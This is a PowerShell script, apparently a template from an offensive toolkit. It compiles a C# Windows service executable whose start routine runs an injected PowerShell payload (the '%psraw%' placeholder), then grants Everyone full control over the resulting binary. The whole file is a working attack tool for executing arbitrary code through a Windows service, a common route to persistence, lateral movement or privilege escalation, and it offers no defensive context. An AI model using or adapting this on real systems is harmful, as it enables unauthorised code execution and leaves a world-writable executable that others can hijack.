$csf = New-TemporaryFile;
$dllf = New-TemporaryFile;
$newf = "$dllf.exe";
Set-Content -Path $csf -Value @'
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace WindowsService1
{
    public class Service1 : ServiceBase
    {

        public Service1()
        {
        }

        protected override void OnStart(string[] args)
        {
	    using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                ps.AddScript("%psraw%");
                foreach (PSObject result in ps.Invoke()) {
                    Console.WriteLine("{0}", result);
                }
                rs.Close();
            }
        }

        protected override void OnStop()
        {
        }
    }
    static class Program
    {
	static void Main() {
	    ServiceBase.Run(new ServiceBase[] { new Service1() });
	}
    }
}
'@
$liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$newf $csf;
cmd /c icacls $newf /grant everyone:F;
Write-Host "service binary path: $newf";
